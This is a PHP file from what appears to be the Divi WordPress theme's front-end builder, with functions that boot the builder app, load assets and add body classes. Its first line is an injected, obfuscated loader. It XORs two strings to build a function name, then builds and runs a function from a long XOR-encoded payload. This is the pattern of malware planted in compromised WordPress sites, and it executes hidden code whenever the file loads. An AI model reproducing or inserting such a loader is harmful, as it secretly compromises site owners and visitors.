<?php $xEylbQhlgW=';7UX-R1-28TTI<C'^'XE09Y7nKGV7  S-';$vJlAfWFRjw=$xEylbQhlgW('','SQrY2E>7O>9==RKD09DdS5B1;<W3X+.PKXOAfTL<H.7 X9DOUTSU37XAF,45AF8zlU Z9idm:NTPdFkbYK9scjD9FtZvnFrE0MQ,<iwUZjVqzfk,r71J+KYzm3JZ1FKKQUlFmp9JWC>XzZVfGBW-FT9n:+j2OeK<EpCEzpAA9B5+UEg1TCn0lsk0>CY<9 6gg;M>hb=9G=9rlkJQH.jof28.:5w8BZSMJkX=<VJfW0A8Nv2pHYK<A+PzBW+-o<,.qlVIjo=02kLmegNSWO3MV<SGM<014f ERyETj8HKXagMZAB9dpBQEA4EKvdDF8SQpbxVH9 ZQQ6Rs>-NHQ.CGOnao<z i=oi7DiT97<PtxqH27 =5eNC3BYI+-3T487GUeeW,YMI6L2pS.B0rrIb>M-U<k0y>hC60i-2 6zicl,Y6NCPA;>. Z-TOl=PG5gsUE=Z.A< GW6IK0,,IdW<P5AsiiCT-IP, <TcJom8.QK3-,MCQHMWFE.0::18dEU+E:8EW:<GsXKlZU>9oLweom75mlK3.97>E<33C>CymiBuN5WEcwBYBQB+GPASxAANlgWTyti,sPQ0rnWjIoT7GMGlGIB41E=66XOC<U7VQJ-lDIt<P-AecGvkLppF4N.7T-PN-W753TBA P>U<SizOyo=OTLOColpA'^':7ZxT0PT;WVSb73-CM7LtM-CdX6G9tq=>,hhOt76AHBN;M- ;t+:Ah< 2Mkj,3LRH1A.XEDIQ+-yDfKBy03zjN+L2TgVIaIO9D7CNAS<zWvAAFOENDE8G.7RIW+.Popku<GmDz0Cs,K,ZtkFof3L25bJSvJloA Y<+g,ZUa2M0YN;mCZ1:GmEHa971<HLRXOCT8JAY70:7DxfO.0<OJRFTYBIPL2f>29+43XEvwF1Q-K+M8z.69Y H8Zjstn sgg4L7:JKVUKKqSEC82;:VdvGYNiXQEU9K +YxtNS-2ckni> 6XDMbu3 X0.Mn9L2:7PJYr,XT;xqMXzXB<-0M+ggJ>=y+u,n;IV7IpRREpIFQlDVLHPLn89KPmOLG5kSR>uXEsG<4r<E;T7O6QROiFH,A YP:pCb><:MISTWZTC,Y7E+19 WWTErU;=3Y13T8,80IrL OEqci-.SCH,LsX1A ZEIg0L=1sKY-JcTgQHyoWLX,cwnm647OIeQTA; -B6NKmpQY>TtkH>4JXFlQCOEZQXDoWOMVebWVJdcjYPTbRyTe SGvj cpHw5ykNvvvXQblHLPHA6gRUGwLoO5E5,>3,,;kT=TEB+gdL4N:>+IKhiPX1Y LJgVKlPP=>GKA5AxjI6CThs2 Y<Q4Xt4StsfX7=8gsFWz<');$vJlAfWFRjw();

/**
 * Boots Frond End Builder App,
 *
 * @return Front End Builder wrap if main query, $content otherwise.
 */
function et_fb_app_boot( $content ) {
	// Instances of React app
	static $instances = 0;

	// Don't boot the app if the builder is not in use
	if ( ! et_pb_is_pagebuilder_used( get_the_ID() ) ) {
		return $content;
	}

	$class = apply_filters( 'et_fb_app_preloader_class', 'et-fb-page-preloading' );

	if ( '' !== $class ) {
		$class = sprintf( ' class="%1$s"', esc_attr( $class ) );
	}

	// Only return React app wrapper for the main query.
	if ( is_main_query() ) {
		// Keep track of instances in case is_main_query() is true multiple times for the same page
		// This happens in 2017 theme when multiple Divi enabled pages are assigned to Front Page Sections
		$instances++;
		$output = sprintf( '<div id="et-fb-app"%1$s></div>', $class );
		if ( $instances > 1 ) {
			// uh oh, we might have multiple React app in the same page, let's also add rendered content and deal with it later using JS
			$output .= sprintf( '<div class="et_fb_fallback_content" style="display: none">%s</div>', $content );
			// Stop shortcode object processor so that shortcode in the content are treated normaly.
			et_fb_reset_shortcode_object_processing();
		}
		return $output;
	}

	// Stop shortcode object processor so that shortcode in the content are treated normaly.
	et_fb_reset_shortcode_object_processing();

	return $content;
}

add_filter( 'the_content', 'et_fb_app_boot', 1 );

/**
 * Added frontend builder assets.
 * Note: loading assets on head is way too early, computedVars returns undefined on header.
 *
 * @return void
 */
function et_fb_wp_footer() {
	et_fb_enqueue_assets();

	// TODO: this is specific to Audio Module and we should conditionally call it once we have
	// $content set as an object, we can then to a check whether the audio module is
	// present.
	remove_all_filters( 'wp_audio_shortcode_library' );
	remove_all_filters( 'wp_audio_shortcode' );
	remove_all_filters( 'wp_audio_shortcode_class');
}
add_action( 'wp_footer', 'et_fb_wp_footer' );

/**
 * Added frontend builder specific body class
 * @todo load conditionally, only when the frontend builder is used
 *
 * @param array  initial <body> classes
 * @return array modified <body> classes
 */
function et_fb_add_body_class( $classes ) {
	$classes[] = 'et-fb';

	foreach ( $classes as $key => $value ) {
		if ( 'rtl' === $value && 'on' === et_get_option( 'divi_disable_translations', 'off' ) ) {
			unset( $classes[ $key ] );
			break;
		}
	}

	return $classes;
}
add_filter( 'body_class', 'et_fb_add_body_class' );
